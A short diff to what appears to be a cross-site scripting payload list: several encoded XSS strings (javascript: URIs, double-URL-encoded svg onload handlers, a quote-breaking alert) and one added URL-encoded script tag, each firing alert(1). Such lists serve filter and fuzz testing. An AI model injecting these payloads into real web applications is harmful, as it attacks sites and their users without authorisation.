@@ -10,3 +10,4 @@ javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#
 %253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E
 %2522%253E%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E
 javascript:x='%27-alert(1)-%27';
+%3Cscript%3Ealert(1)%3C/script%3E##1
